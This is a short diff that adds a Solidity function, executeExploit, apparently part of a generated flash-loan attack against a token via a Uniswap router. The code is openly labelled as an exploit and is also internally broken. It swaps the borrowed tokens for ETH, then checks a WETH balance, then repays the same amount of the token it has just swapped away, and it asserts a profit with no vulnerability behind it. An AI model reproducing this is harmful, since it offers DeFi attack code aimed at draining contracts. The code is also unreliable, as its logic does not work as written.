@@ -1,0 +1,25 @@
+```solidity
+<executeExploitCode>
+function executeExploit(uint256 amount) internal {
+    // Start using the flash loan to trigger an exploit
+    // Acquire tokens needed for the exploit by executing swaps
+    address[] memory path = new address[](2);
+    path[0] = address(valuableToken); // Assuming valuableToken is the token you want to exploit
+    path[1] = uniswapRouter.WETH(); // Assuming you will convert to WETH
+
+    // Swap part of valuableToken to WETH
+    uniswapRouter.swapExactTokensForETH(amount, 0, path, address(this), block.timestamp);
+
+    // After swapping for WETH, check how much WETH is in balance
+    uint256 wethBalance = IERC20(uniswapRouter.WETH()).balanceOf(address(this));
+    console.log("WETH balance after swap: %s", wethBalance);
+
+    // Repay the flash loan, returning the borrowed amount of valuableToken
+    valuableToken.transfer(flashloanProvider, amount);
+
+    uint256 surplus = IERC20(valuableToken).balanceOf(address(this));
+    console.log("Surplus of valuableToken: %s", surplus);
+    assert(surplus > 0); // Ensure there is profit after the repay
+}
+</executeExploitCode>
+```
